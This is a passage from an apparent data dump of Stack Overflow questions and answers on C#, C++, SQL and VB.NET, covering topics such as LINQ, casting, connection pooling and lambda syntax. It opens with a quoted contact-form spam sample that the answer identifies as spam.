Email: cervau@fbcalj.com

Email confirm: cervau@fbcalj.com

Phone: 47668113220

Subject: uSMvoegKPt

Message: KU17Gd  &lt;a href=""http://lsyixbpcjddi.com/""&gt;lsyixbpcjddi&lt;/a&gt;,
[url=http://sojlxycrnxlb.com/]sojlxycrnxlb[/url], [link=http://wesixtcvuzbj.com/]wesixtcvuzbj[/link], http://dcgfyjhpfpbx.com/
</code></pre>
","33708","","<p>It looks more like  a spammer to me. If you have more of these messages than you can handle, you need to add a CAPTCHA to your contact form. I don't think it's intended to exploit a potential security issue in your application though.</p>
"
"<p>I have many many functions (100+ estimated) and more then half are only needed in the file its defined. Is there a way to define functions so it scope is at a file level?</p>
","33708","","<p>No. There's no way to restrict access to a single ""file"". You can put all the functions in a single class and make the ones you want to protect <code>private</code>. Alternatively, you may put all the functions inside another assembly and make the protected ones <code>internal</code>. </p>
"
"<p>I have a List that I need to split into sublists, one for each value of MyStruct.GroupingString.  Can I do this via linq?</p>
","33708","","<pre><code>List&lt;List&lt;StructType&gt;&gt; groupings = list.GroupBy(x =&gt; x.GroupingString)
                                       .Select(x =&gt; x.ToList()).ToList();
</code></pre>
"
"<p>Can we return  null value from stored procedure. i dont want to use collase or isnull. I want to capture NULL at the frontend. Is it possible ?</p>

<p><strong>Edit:</strong> </p>

<blockquote>
  <p>I am using <code>Sql Server 2005</code></p>
</blockquote>

<p>eg. where i want to use </p>

<pre><code>CREATE PROCEDURE [Authentication].[spOnlineTest_CheckLogin]

  @UserName  NVARCHAR(50)
AS
 BEGIN TRY
  BEGIN TRAN
                    COMMIT TRAN
     RETURN NULL
        END TRY
</code></pre>

<p><strong>Error</strong> 
The 'spOnlineTest_CheckLogin' procedure attempted to return a status of NULL, which is not allowed. A status of 0 will be returned instead.
Msg 0, Level 11, State 0, Line 0
A severe error occurred on the current command.  The results, if any, should be discarded. </p>
","33708","","<p>No, the return type of a stored procedure is <code>INT</code> and it cannot be null.</p>
"
"<p>In the data structures class that I am currently taking, we have been tasked with writing a web crawler in C++. To give us a head start, the professor provided us with a program to get the source from a given URL and a simple HTML parser to strip the tags out. The main function for this program accepts arguments and so uses argc/argv. The code used to check for the arguments is as follows:</p>

<pre><code>// Process the arguments
if (!strcmp(option, ""-h""))
{
    // do stuff...
}
else if (!strcmp(option, """"))
{
    // do stuff...
}
else if (!strcmp(option, ""-t""))
{
    // do stuff...
}
else if (!strcmp(option, ""-a""))
{
    // do stuff...
}

if ( *argv == NULL )
{
    exit(1);
}
</code></pre>

<p>Where ""option"" has been populated with the switch in argv[1], and argv[2] and higher has the remaining arguments. The first block I understand just fine, if the switch equals the string do whatever based on the switch. I'm wondering what the purpose of the last if block is though.</p>

<p>It could be that my C++ is somewhat rusty, but I seem to recall *argv being equivalent to argv[0], basically meaning it is checking to make sure arguments exist. Except I was under the impression that argv[0] always (at least in most implementations) contained the name of the program being run. It occurs to me that argv[0] could be null if argc is equal to 0, but searching around on Google I couldn't find a single post determining whether or not that is even possible.</p>

<p>And so I turn to you. What exactly is that final if block checking?</p>

<p><strong>EDIT:</strong> I've gone with the reasoning provided in the comments of the selected answer, that it may be possible to intentionally cause argv[0] to become NULL, or otherwise become NULL based on an platform-specific implementation of main.</p>
","33708","","<p><code>argc</code> will provide you with the number of command line arguments passed. You shouldn't need to check the contents of <code>argv</code> too see if there are not enough arguments.</p>

<pre><code>if (argc &lt;= 1) { // The first arg will be the executable name
   // print usage
}
</code></pre>
"
"<pre><code>IQueryable&lt;SomeType&gt; collection = GetCollection();
foreach (var c in collection)
{
    //do some complex checking that can't be embedded in a query
    //based on results from prev line we want to discard the 'c' object
}

//here I only want the results of collection - the discarded objects
</code></pre>

<p>So with that simple code what is the best way to get the results. Should I created a List just before the foreach and insert the objects I want to keep, or is there some other way that would be better to do this type of thing.</p>

<p>I know there are other posts on similar topics but I just don't feel I'm getting what I need out of them.</p>

<p><strong>Edit I tried this</strong></p>

<pre><code> var collection = GetCollection().Where(s =&gt;
 {
      if (s.property == 1)
      {
           int num= Number(s);
           double avg = Avg(s.x);
           if (num &gt; avg)
               return true;
           else
               return false;
      }
      else return false;
 });
</code></pre>

<p>I tried this but was given ""A lambda expression with a statement body cannot be converted to an expression tree"" on compile. Did I not do something right? </p>
","33708","","<blockquote>
<pre><code>//do some complex checking that can't be embedded in a query
</code></pre>
</blockquote>

<p>I don't get it. You can pass a delegate which can point to a very complex function (Turing-complete) that checks whether you should discard it or not:</p>

<pre><code>var result = GetCollection().AsEnumerable().Where(c =&gt; { 
  // ...
  // process ""c""
  // return true if you want it in the collection
             });
</code></pre>

<p>If you want, you can refactor it in another function:</p>

<pre><code>var result = GetCollection.Where(FunctionThatChecksToDiscardOrNot);
</code></pre>
"
"<p>I am working on a console application that I want to run in the background of machines from the moment they boot to shutdown. Now I know that it would be optimum to create a Windows Service, but in this case I need to be able to intetact with certificate stores and I do not believe that a local service account certificate store will do.</p>

<p>I am looking at System.Timers for keeping the application running rather than bludgening in to death with an infinite while statement, is this a logical way to handle this or is there a better way in which to keep the application open? The application will be checking into a SQL database frequently to see if there is any work to do.</p>
","33708","","<p>You can run Windows Services under any user with appropriate privileges. You are not required to run it under Local Service account.</p>
"
"<p>So, the following lambda expression is not returning any elements in the collection, even though while stepping through I was able to verify that 1 item matches the criteria. I've added a sample of the class with it's IEquatable implementation.</p>

<pre><code>...within a method, foo is a method parameter
var singleFoo = _barCollection.SingleOrDefault(b =&gt; b.Foo == foo);
</code></pre>

<p>The above returns nothing. Any suggestions as to what to do to make the expression above work?</p>

<pre><code>public class Foo: IEquatable&lt;Foo&gt; 
{
    public string KeyProperty {get;set;}
    public bool Equals(Foo other)
    {
        if (ReferenceEquals(null, other)) return false;
        if (ReferenceEquals(this, other)) return true;
        return other.KeyProperty==KeyProperty;
    }
    public override bool Equals(object obj)
    {
        if (ReferenceEquals(null, obj)) return false;
        if (ReferenceEquals(this, obj)) return true;
        if (obj.GetType() != typeof (Foo)) return false;
        return Equals((Foo) obj);
    }
    public override int GetHashCode()
    {
        return (KeyProperty != null ? KeyProperty.GetHashCode() : 0);
    }
}
</code></pre>

<p>To make sure I didn't go insane, I created the following nUnit test which passes:</p>

<pre><code>    [Test]
    public void verify_foo_comparison_works()
    {
        var keyString = ""keyValue"";
        var bar = new Bar();
        bar.Foo = new Foo { KeyProperty = keyString };
        var basicFoo = new Foo { KeyProperty = keyString };
        var fromCollectionFoo = Bars.SingleFooWithKeyValue;
        Assert.AreEqual(bar.Foo,basicFoo);
        Assert.AreEqual(bar.Foo, fromCollectionFoo);
        Assert.AreEqual(basicFoo, fromCollectionFoo);
    }
</code></pre>

<p>Attempt at overriding == and !=:</p>

<pre><code>    public static bool operator ==(Foo x, Foo y)
    {
        if (ReferenceEquals(x, y))
            return true;
        if ((object)x == null || (object)y == null)
            return false;
        return x.KeyProperty == y.KeyProperty;
    }
    public static bool operator !=(Foo x, Foo y)
    {
        return !(x == y);
    }
</code></pre>
","33708","","<p>They use <a href=""http://msdn.microsoft.com/en-us/library/ms224763.aspx""><code>EqualityComparer&lt;T&gt;.Default</code></a> for equality comparisons and <a href=""http://msdn.microsoft.com/en-us/library/azhsac5f.aspx""><code>Comparer&lt;T&gt;.Default</code></a> for ordered comparisons.</p>

<blockquote>
  <h3>MSDN - <code>EqualityComparer&lt;T&gt;.Default</code> Remarks:</h3>
  
  <p>The <code>Default</code> property checks whether type <code>T</code> implements the <code>System.IEquatable(Of T)</code> generic interface and if so returns an <code>EqualityComparer(Of T)</code> that uses that implementation. Otherwise it returns an <code>EqualityComparer(Of T)</code> that uses the overrides of <code>Object.Equals</code> and <code>Object.GetHashCode</code> provided by <code>T</code>.</p>
  
  <h3>MSDN - <code>Comparer&lt;T&gt;.Default</code> Remarks:</h3>
  
  <p>The <code>Comparer(Of T)</code> returned by this property uses the <code>System.IComparable(Of T)</code> generic interface (<code>IComparable&lt;T&gt;</code> in C#, <code>IComparable(Of T)</code> in Visual Basic) to compare two objects. If type <code>T</code> does not implement the <code>System.IComparable(Of T)</code> generic interface, this property returns a <code>Comparer(Of T)</code> that uses the <code>System.IComparable</code> interface.</p>
</blockquote>
"
"<p>In some library I create I have to use following cast:</p>

<pre><code>public void Foo(IList&lt;uint&gt; uintsList) // I need to use uint in the interface for this method
{
    List&lt;double&gt; doublesList = uintsList.Cast&lt;double&gt;().ToList();
    // Do something with the doublesList
}
</code></pre>

<p>I assumed that cast <code>uint</code> -> <code>double</code> should be always valid, and during my test it always worked fine.</p>

<p>But in the application, which uses this method the <code>InvalidCastException</code> occured. Unfortunately I do not have access to this application. So here are my questions:</p>

<ul>
<li>What could cause this exception occured? Isn't the cast uint->double always valid?</li>
<li>How can I secure my algorithm to avoid this exception? </li>
</ul>

<p><strong>EDIT</strong><br>
Of course, before casting I always perform check to avoid situation when <code>uintsList</code> is null or empty</p>

<p><strong>EDIT 2</strong>
OK, the problem is solved, I changed the  cast using the <code>ConvertAll</code> method, but still I don't understand how it could happen?<br>
So this question still bothers me: <strong>how the same part of the code could run properly at my computer, and throw an exception at another?</strong> Different compiler/environment versions? Some specific settings? Can anyone tell me where should I seek for the reasons of this situation to avoid it in the future? </p>
","33708","","<p><code>.Cast</code> method is not meant to perform type conversion like that. It just performs conversions in the inheritance hierarchy. </p>

<p>The reason for this behavior is that the extension method signature takes an <code>IEnumerable</code> and not <code>IEnumerable&lt;T&gt;</code>. Consequently, getting the <code>Current</code> property of the enumerator returns an <code>object</code> to the <code>Cast</code> method. Of course, you can't unbox a value type of one type to another type directly. Basically, <code>Cast</code> will do something like:</p>

<pre><code>int i = 42;
object o = i;
double d = (double)o; // fails.
</code></pre>
"
"<p>How do I check at runtime if an object if of type ClassA or of derived type ClassB? In one case I have to handle both instances separately</p>

<pre><code>ClassA* SomeClass::doSomething ( ClassA* )
{
    if( /* parameter is of type base class */) {

    } else if { /* derived class */ ) {

    }
}
</code></pre>

<p>Maybe I could say that the derived class ClassB has some special capabilities. But how do I do that without changing the existing class ClassA ?</p>
","33708","","<p>It's generally a very bad idea to switch on the exact type like that. By doing this, you are tightly coupling your method to derived classes of <code>ClassA</code>. You should use polymorphism. Introduce a <code>virtual</code> method in class A, override it in class B and simply call it in your method.</p>

<p>Even if I was forced to handle the functionality in the external function itself for some reason, I would do something like:</p>

<pre><code>class ClassA { 
  public: virtual bool hasSpecificFunctionality() { return false; }
};

class ClassB : public ClassA {
  public: virtual bool hasSpecificFunctionality() { return true; }
};

ClassA* SomeClass::doSomething ( ClassA* arg )
{
    if (arg-&gt;hasSpecificFunctionality()) {

    } else {

    }
}
</code></pre>
"
"<p>Datatype of field in the DB is FLOAT and the value is 18.7. I'd like to store and display this on page as 18.70. Whenever I enter the extra 0 it still only stores it as 18.7</p>

<p>How can I store the extra 0 ? I can change the data type of the field.</p>
","33708","","<p>Floating point types do not store the number of insignificant zeros on the left side of a number before decimal digit or on the right side of the number after the decimal digit.  You'll need to use a string-based type (or store the precision in a separate field) if you want to store the exact numeric string entered by the user and be able to distinguish 12.7 from 12.70.  You can, however, round things that you display by two digits in your application.</p>
"
"<p>I was thinking about creating an iPhone app ""front end"" for one of our internal systems.</p>

<p>I suspect this will need to run via a Cisco VPN (connecting with a key code).</p>

<p>What are the options to do this on the iPhone?</p>

<p>Do you need to manually connect to a VPN somehow using the iPhone and then start the iPhone app?</p>

<p>Or can the app prompt users to enter their key code and then start the VPN session?</p>
","33708","","<p>No, (as of iPhone SDK 3.1.2) there's no API provided by the SDK to manipulate VPN connections. The user will have to manually connect to the network.</p>
"
"<p>If I have a class called ""Animal"", and a derived class ""Bird : public Animal"", I can create a Bird these two ways:</p>

<pre><code>Animal *sparrow = new Bird;
Bird *sparrow = new Bird;
</code></pre>

<p>Both compile fine and work as expected. Are they equivalent? Should I prefer one over the other?</p>
","33708","","<p>The line, in itself, doesn't demonstrate the difference. However, assume <code>Bird</code> declares a method <code>Fly</code> that doesn't exist on <code>Animal</code>. You wouldn't be able to do:</p>

<pre><code>Animal* a = new Bird;
a-&gt;Fly();
</code></pre>

<p>on the other hand, this is legal:</p>

<pre><code>Bird* b = new Bird;
b-&gt;Fly();
</code></pre>

<p>The distinction here is a result of the fact that C++ is a statically typed language. The static type of the variable is what the compiler cares about when it's verifying things like method calls. Since the static type of the variable <code>a</code> is <code>Animal</code> which doesn't have a <code>Fly</code> method, the compiler will not allow you to call <code>Fly</code> on it (not all animals are able to fly, so you'll have to explicitly cast to <code>Bird</code>: <code>dynamic_cast&lt;Bird*&gt;(a)-&gt;Fly()</code> is legal).  </p>

<p>The expression <code>new Bird</code> will have the type <code>Bird*</code>. If you assign a value of a derived type to a variable of a based type, the compiler will not complain (all <code>Bird</code>s are <code>Animal</code>s, so it should always work). Basically, the compiler upcasts <code>Bird*</code> to <code>Animal*</code>. The reverse is not true. Not all <code>Animal</code>s are <code>Bird</code>s, so you'll have to take the responsibility and do the cast explicitly and tell the compiler that I know that object is really a <code>Bird*</code>. Only in that case the compiler will let you to use <code>Bird</code>-specific features. So, in general, if you need to use a <code>Bird</code>-specific member, you'd better use <code>Bird* b = new Bird;</code>.</p>
"
"<p>If sorting by int is faster, what is the trick to sort a table by DateTime using the power of sorting by int ?</p>
","33708","","<p>Assuming all other things are equal (both columns are similarly indexed or not indexed), sorting <code>int</code> columns should be theoretically faster since they are smaller (4 bytes vs. 8 bytes) and this can make individual comparisons faster.  </p>
"
"<p>I have following code that populates a System.Collections.Generic.List I don't like it so I was wondering if there is a better way to do this.</p>

<pre><code>let getDirectories = 
        Directory.GetDirectories(_baseFolder)
let languagesList = new System.Collections.Generic.List&lt;string&gt;()
Seq.cast getDirectories 
|&gt; Seq.map(fun dir -&gt; (new DirectoryInfo(dir)).Name) 
|&gt; fun range -&gt; languagesList.AddRange(range)
</code></pre>
","33708","","<p>Have you tried:</p>

<pre><code>let list = new System.Collections.Generic.List&lt;string&gt;(arr)
</code></pre>

<p><code>List&lt;'T&gt;</code> has a constructor that takes an <code>IEnumerable&lt;'T&gt;</code> so it happily takes any <code>seq&lt;'T&gt;</code> you pass to it.</p>
"
"<p>Is it possible to group rows with columns and have the remaining data merged in another column ?</p>

<p>Here's an image to better understand the question and see what I want to achieve:</p>

<p><img src=""http://img693.imageshack.us/img693/9227/linqgroupingquestion.gif"" alt=""The wanted result""></p>

<p>You can see the grouping by <code>IdPlace</code>, <code>IdInternship</code> and the new column <code>IdUsers</code> made with details, or composition of user ids.</p>

<p>I don't care if I cannot work anymore with data in new column, it's for display.</p>
","33708","","<p>You're looking for something like:</p>

<pre><code>var result = 
  collection.GroupBy(x =&gt; new { x.IdPlace, x.IdInternship })
    .Select(x =&gt; new { x.Key.IdPlace, x.Key.IdInternship,
           IdUsers = String.Join("", "", 
                        x.Select(c =&gt; c.IdUser.ToString()).ToArray()) });
</code></pre>

<p>(<code>.ToArray()</code> is unnecessary in .NET 4.0)</p>
"
"<p>I want to deploy the release version of my application done in C#.</p>

<p>When I build using the RELEASE config I still can see that the .pdb file is produced meaning that my application can be still debugged; this means also that still some debug information is present somewhere in my code slowing it down a little bit.</p>

<p>If this is true how to completely suppress any debug information produced in the code?
Do you know also the reason of this .pdb? The RELEAASE configuration has the OPTIMIZED code checked and only the TRACE constant defined, not the DEBUG.
Thanks for the help</p>
","33708","","<p>Having the compiler generate a <code>.pdb</code> file is not mutually exclusive to having it optimize the code. </p>

<p>For more info on this subject, read these <a href=""http://blogs.msdn.com/ericlippert/archive/2009/06/11/what-does-the-optimize-switch-do.aspx"" rel=""nofollow"">blog</a> <a href=""http://www.wintellect.com/CS/blogs/jrobbins/archive/2009/06/19/do-pdb-files-affect-performance.aspx"" rel=""nofollow"">entries</a>.</p>
"
"<p>I have ClassB, which is nested inside of ClassA. In ClassA I have a variable called _MyId... how can I access _MyId from ClassB?</p>

<p>Thanks in advance!</p>
","33708","","<p>If the field is <code>static</code>, you can simply refer to it as <code>ClassA._MyId</code>. If it's not you should use <code>classAInstance._MyId</code> where <code>classAInstance</code> is an instance of <code>ClassA</code>.</p>

<p>If you're coming from Java background, you should note that nested classes in C# are similar to <strong>static</strong> nested classes in Java.</p>
"
"<p>For example:</p>

<pre><code>public enum Unit{
  KW,
  kV,
  V,
  Hz,
  %V
}
</code></pre>

<p>In this case % is a special character. So, how can I put this char in a enum?</p>
","33708","","<p>Enum members shouldn't be used for user interface display purposes. They should be mapped to a string in order to get displayed. You can create a string array (or a dictionary) that maps each enum member to a string for user interaction. </p>

<p><strike>That said, to answer your question directly, you can use <code>\uxxxxV</code> were <code>xxxx</code> is the hexadecimal number representing the Unicode code point for <code>%</code>. This is far from recommended.</strike> As Henk points out, this won't work for <code>%</code> as it's not in Unicode classes Lu, Ll, Lt, Lm, Lo, Nl, Mn, Mc, Nd, Pc, Cf (letters, digits, connecting, and formatting characters). Only these characters are acceptable for identifiers.</p>
"
"<p>Greetings, I would like to ask if creating Singleton to have only one active connection to db is a good idea. What i would like to do is:
1) I have a wcf service
2) wcf service gets data from db
3) i would like to create a singleton like this to have only one connection to db:</p>

<pre><code>private static PersistanceSingleton _Instance;
    public static PersistanceSingleton Instance
    {
        get
        {
            if (_Instance == null)
            {
                _Instance = new PersistanceSingleton();
            }
            return _Instance;
        }
    }
</code></pre>

<p>I know this is not an ideal singleton but i just wrote it for this post purpose. 
I would like to have some persistance repositories here and which I will be instantiating them in constructor. 
Inside my service class I would have the following code inside constructor</p>

<pre><code>_DBPersistanceSingleton = PersistanceSingleton.Instance;
</code></pre>

<p>Then  when some request comes (e.g. GetUsersRequest) i would like to do something like:</p>

<pre><code>_DBPersistanceSingleton.GetUsers()
</code></pre>

<p>Before each call to db is executed I will also check whether SqlConnection is open or not. 
Please let me know if this is a good practice. The reason why I think about this solution is because of large number of users that will be connecting to that service via client application</p>
","33708","","<p>It's not a good practice to reuse <code>SqlConnection</code> like that. Open it when you need it and close it as soon as you're done with it. Connection pooling will work for you under the hood reusing the connection.</p>
"
"<p>I ran some code through an automatic translator for C# to VB, and it translated some code like this:</p>

<pre><code>Public Property Title As [String]
</code></pre>

<p>How is this different to </p>

<pre><code>Public Property Title As String
</code></pre>

<p>and why do both exist?</p>
","33708","","<p><code>String</code> is a keyword. If you want to use a keyword as an identifier, you'll have to enclose it in brackets. <code>[String]</code> is an identifier. <code>String</code> keyword always refers to <code>System.String</code> class while <code>[String]</code> can refer to your own class named <code>String</code> in the current namespace. Assuming you have <code>Imports System</code>, both refer to the same thing most of the time but they <em>can</em> be different:</p>

<pre><code>Module Test
    Class [String]
    End Class
    Sub Main()
        Dim s As String = ""Hello World""        // works
        Dim s2 As [String] = ""Hello World""     // doesn't work
    End Sub
End Module
</code></pre>

<p>The primary reason for existence of <code>[ ]</code> for treating keywords as identifiers is interoperability with libraries from other languages that may use VB keywords as type or member names. </p>
"
"<p>Alright... my Introduction to Data Structures from CS is so rusty I need to ask this here.</p>

<p>I have a linked list whose structure is:</p>

<pre><code>struct Data_Struct {
    char *Name;
    char *Task;
    char *Pos;
    struct Data_Struct *Next;
};
typedef struct Data_Struct MyData;
</code></pre>

<p>Now, at some point in my application I filled the list with data.</p>

<p>The question is, how do I get the total size of the data stored in there? How many chars are there? Something like</p>

<pre><code>sizeof(MyData);
</code></pre>

<p>That will return the size of the info stored in the list.</p>

<p>code is appreciated.</p>

<p>Thanks!</p>

<p><strong>EDIT</strong>:
Unfortunately this is NOT homework. I finished school more than 20 years ago and frankly i never ever had to use linked lists on anything. I just don't remember.
What I am doing is iterate the list and get the strlen() of each element and keep it on a global size but I wanted to know if there was a better way.</p>

<p>and NO, I don't need the size of the linked likes (the count of nodes), i just want to know how many characters are stored in there.</p>

<p>thanks</p>
","33708","","<p>Well, you can traverse the list to calculate the count pretty easily. Obviously the total memory will be equal to the number of items multiplied by size of each item (<code>sizeof(Data_Struct)</code>).</p>

<p>Of course, this will be the size of the linked list itself and doesn't include the memory allocated for the strings. A pointer doesn't have any information about the amount of allocated memory it refers to, so strictly speaking, you can't calculate the amount of total memory allocated directly by just looking at a linked list like that. Additionally, there may be duplicate pointers in the linked list you will need to keep track of. That said, assuming all pointer are unique, you can calculate the number of chars in each item by summing up return values of <code>strlen</code> calls on each pointer as you are traversing the list (which should be pretty straightforward).</p>
"
"<p>Edit (again): Let me simplify my problem.  I have a Windows Service that exposes some WCF endpoints with methods like:</p>

<pre><code>int ExecuteQuery(string query) {
   // asynchronously execute query that may take 1 second to 20 minutes
   return queryId;
}

string GetStatus(int queryId) {
   // return the status of the query (# of results so far, etc)
}
</code></pre>

<p>What is the best way to implement the <code>ExecuteQuery</code> method?  Should I just call <code>ThreadPool.QueueUserWorkItem</code> to get my query going?  </p>

<p>Note that the actual work behind executing a query is done by load-balanced black box.  I want to be able to have several queries going at the same time.  </p>

<p>The analogy is a web browser that is downloading multiple files simultaneously and you have a download manager that can track the status of each file.</p>
","33708","","<p>Take a look at <a href=""http://www.microsoft.com/windowsserver2003/technologies/msmq/default.mspx"" rel=""nofollow"">Microsoft Message Queuing (MSMQ)</a>:</p>

<blockquote>
  <p>Microsoft Message Queuing (MSMQ) technology enables applications running at different times to communicate across heterogeneous networks and systems that may be temporarily offline. MSMQ provides guaranteed message delivery, efficient routing, security, and priority-based messaging. It can be used to implement solutions for both asynchronous and synchronous messaging scenarios.</p>
</blockquote>

<p>It's good to know that Windows Communication Foundation (WCF) can leverage queuing services offered by MSMQ.</p>
"
"<p>Is there an easy way to check if a file is empty.  Like if you are passing a file to a function and you realize it's empty, then you close it right away?  Thanks.</p>

<p>Edit, I tried using the fseek method, but I get an error saying 'cannot convert ifstream to FILE *'.  </p>

<p>My function's parameter is </p>

<pre><code>myFunction(ifstream &amp;inFile)
</code></pre>
","33708","","<p>Seek to the end of the file and check the position:</p>

<pre><code> fseek(fileDescriptor, 0, SEEK_END);
 if (ftell(fileDescriptor) == 0) {
     // file is empty...
 } else {
     // file is not empty, go back to the beginning:
     fseek(fileDescriptor, 0, SEEK_SET);
 }
</code></pre>

<p>If you don't have the file open already, just use the <code>fstat</code> function and check the file size directly.</p>
"
"<p>I want to add colections to List, but only if Advertisements does not already exist in it. I know that HashSet works like this that has no duplicate values, but with HashSet i can not use AddRange and GetRange.</p>

<p>So is it possible to simulate List like hashSet?</p>

<pre><code>List&lt;Advertisements&gt; advertisements = new List&lt;Advertisements&gt;();

advertisements.AddRange(NHibernateSession.CreateCriteria&lt;Advertisements&gt;()
.CreateCriteria(AdvertisementsProperties.City.ToString())
.Add(Restrictions.Or(
Restrictions.Like(CitiesProperties.Name.ToString(), text, MatchMode.Anywhere),
Restrictions.Like(CitiesProperties.SlovenianName.ToString(), text, MatchMode.Anywhere)))
.List&lt;Advertisements&gt;());

advertisements.AddRange(NHibernateSession.CreateCriteria&lt;Advertisements&gt;()
.CreateCriteria(AdvertisementsProperties.Area.ToString())
.Add(Restrictions.Or(
Restrictions.Like(AreasProperties.Name.ToString(), text, MatchMode.Anywhere),
Restrictions.Like(AreasProperties.SlovenianName.ToString(), text, MatchMode.Anywhere)))
.List&lt;Advertisements&gt;());
</code></pre>
","33708","","<p>To add a bunch of items to a <code>HashSet</code> like <code>AddRange</code> does simply use:</p>

<pre><code>set.UnionWith(items);
</code></pre>

<p>The items in a <code>HashSet</code> are not indexed (it's implemented as a hash table which is not designed for index based access to elements). If you strictly need to store items by index, you'll have to use a simple list and create your own <code>Add</code> method that checks <code>Contains</code> on each element before adding it to the underlying list. Of course, a linear list doesn't provide the efficiency of set operations as <code>HashSet</code> does.</p>
"
"<p>Around 90% of the pages for our websites have no .Net code embedded in them yet are published as .aspx files. I want these to render as fast as possible so I'm removing as much as I can. </p>

<p>Does the .Net page directive have an impact on performance?  I am thinking about two factors; the page speed for each GET and what happens when the file changes.  The CMS system re-creates each page daily and I'm wondering if this triggers the ASP.Net compilation process.</p>
","33708","","<p>The <code>&lt;%@ Page %&gt;</code> directive is not required. Without it, the default values for <code>Language</code> and other stuff will be assumed. </p>

<p>By changing a <code>.aspx</code> file, <a href=""http://msdn.microsoft.com/en-us/library/ms366723.aspx"" rel=""nofollow"">it'll be recompiled (it doesn't recompile the whole app though)</a>:</p>

<blockquote>
  <p>Any changes to a dynamically compiled file will automatically invalidate the file's cached compiled assembly and trigger recompilation of all affected resources. The next time a request to the code is made, ASP.NET recognizes that the code has changed and recompiles the affected resources of the Web application. This system enables you to quickly develop applications with a minimum of compilation processing overhead. (Note that depending on the change to the resources, the result can range from recompiling a single page to recompiling the whole Web site.)</p>
</blockquote>
"
"<p>When I read about the performance of JITted languages like C# or Java, authors usually say that they should/could theoretically outperform many native-compiled applications.  The theory being that native applications are usually just compiled for a processor family (like x86), so the compiler cannot make certain optimizations as they may not truly be optimizations on all processors.  On the other hand, the CLR can make processor-specific optimizations during the JIT process.</p>

<p>Does anyone know if Microsoft's (or Mono's) CLR actually performs processor-specific optimizations during the JIT process?  If so, what kind of optimizations?</p>
","33708","","<p>One processor specific optimization I'm aware of that's done in Mono is compiling <a href=""http://tirania.org/blog/archive/2008/Nov-03.html""><code>Mono.Simd</code> calls</a> down to SSE instructions on processors that support SSE. If the processor running the code doesn't support SSE, the JIT compiler will output the equivalent non-SSE code.</p>
"
"<p>As per my understanding a lock is not released until the runtime completes the code block of the lock(obj) ( because when the block completes it calls Monitor.Exit(obj).</p>

<p>With this understanding i am not able to understand the reason behind the behaviour of the following <strong>code :</strong></p>

<pre><code>private static string obj = """";
        private static void RecurseSome(int number)
        {
            Console.WriteLine(number);
            lock (obj)
            {
                RecurseSome(++number);
            }
        }
</code></pre>

<p>//<strong>Call:</strong> <code>RecurseSome(0)</code></p>

<p>//<strong>Output:</strong> <code>0 1 2 3...... stack overflow exception</code></p>

<p>There must be some concept that i am missing. Please help.</p>
","33708","","<p>The lock is owned by the current thread. The recursive call is made on the current thread too. If <em>another thread</em> tries to acquire the lock, it'll block.</p>
"
"<p>How to retrieve data from two tables whose column names are the same?</p>
","33708","","<p>If you want to include rows from both tables, you can use <code>UNION ALL</code>:</p>

<pre><code>SELECT Col1, Col2, Col3 FROM Table1
UNION ALL
SELECT Col1, Col2, Col3 FROM Table2
</code></pre>
"
"<p>I'm reflecting a C++/CLI method that has the following signature:</p>

<pre><code>void foo(long n);
</code></pre>

<p>This translates into C# as:</p>

<pre><code>void foo(int modopt(IsLong) n);
</code></pre>

<p>How can I find if an <em>int</em> parameter is actually a C++/CLI long by reflection?</p>
","33708","","<p>Check the <code>ParameterInfo</code> instance's optional custom modifiers:</p>

<pre><code>bool IsLongParameter(System.Reflection.ParameterInfo p) {
   Type[] modifiers = p.GetOptionalCustomModifiers();
   return modifiers.Contains(typeof(System.Runtime.CompilerServices.IsLong));
}
</code></pre>
"
"<p>I have the following link function</p>

<pre><code>MyLinqToSQLTable.Where(x =&gt; x.objectID == paramObjectID).ToList();
</code></pre>

<p>I most of the time you can change a linq call to be several lines by adding curly brackets around the method body.  Like this:</p>

<pre><code>MyLinqToSQLTable.Where(x =&gt;
{ 
    x.objectID == paramObjectID;
}).ToList();
</code></pre>

<p>Problem is the implied return that was there when I just did a Boolean compare is now not done.  Return (x.objectID == paramObjectID); is not accepted either.</p>

<p>How do do this?  can I do this? </p>

<p>NOTE: I know that I can add another where clause if needed.  But I would still like to know the answer to this.</p>
","33708","","<p>Your first query is equivalent to this one:</p>

<pre><code>MyLinqToSQLTable.Where(x =&gt;
{ 
    return x.objectID == paramObjectID;
}).ToList();
</code></pre>

<p>You are missing the <code>return</code> keyword here. It's necessary when the lambda body is an explicit block rather than an expression.</p>

<p>The spec formally defines <em>lambda-expression</em> in grammar like:</p>

<blockquote>
  <p><em>lambda-expression</em>:<br>
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<em>anonymous-function-signature</em>   =>   <em>anonymous-function-body</em></p>
  
  <p><em>anonymous-function-body</em>:<br>
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<em>expression</em><br>
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<em>block</em></p>
</blockquote>

<p>The former case (<em>expression</em>) applies when the body doesn't begin with a left curly brace. The latter case (<em>block</em>) is defined as a series of statements (just like a method body). Like other places in C#, expression statements in a block are restricted to declarations, assignments, function call, increment, and decrement. Merely applying operator <code>==</code> to a couple identifiers doesn't the expression a valid statement. The second issue is that when the return type of a method (anonymous or not) is not <code>void</code>, all code paths reaching the end of the block should return a value. Consequently, even if the body of your lambda was syntactically valid, without a return statement, your lambda would be convertible to <code>Action&lt;T&gt;</code>, and not <code>Func&lt;T, bool&gt;</code> that <code>Where</code> method expects. </p>

<hr>

<h3>Update:</h3>

<blockquote>
  <p>Problem is the implied return that was there when I just did a Boolean compare is now not done. Return (x.objectID == paramObjectID); is not accepted either.</p>
</blockquote>

<p>Of course, the <code>x =&gt; { return x.objectID == paramObjectID; }</code> variant of your lambda expression is <em>only possible</em> when it's supposed to be converted to an <strong>anonymous method</strong>, not an <strong>expression tree</strong>.  That is, a lambda with a <em>block</em> body is not convertible to <code>Expression&lt;T&gt;</code>. That's why you can use it in LINQ to Objects (in which <code>Where</code> takes <code>Func&lt;T, bool&gt;</code>) but you can't use it in LINQ to SQL (in which <code>Where</code> takes <code>Expression&lt;Func&lt;T, bool&gt;&gt;</code>).</p>
"
"<p>In VB.NET, it is entirely possible to pass an integer as a string parameter to a method without calling <code>.ToString()</code> - it's even possible to call <code>.ToString</code> without the ()'s. The code will run without a problem, VB will interpret the integer as a string without having been told to.</p>

<p>In C#, these would cause compilation errors - you are required to call <code>.ToString()</code> and to call it correctly in that situation before it will compile.</p>

<p>Is there a way to make the VB compilation process check for the same things as the C# compilation process? Would it be best practice in a mixed team to force this check?</p>
","33708","","<p>Make sure you have</p>

<pre><code>Option Strict On
Option Explicit On
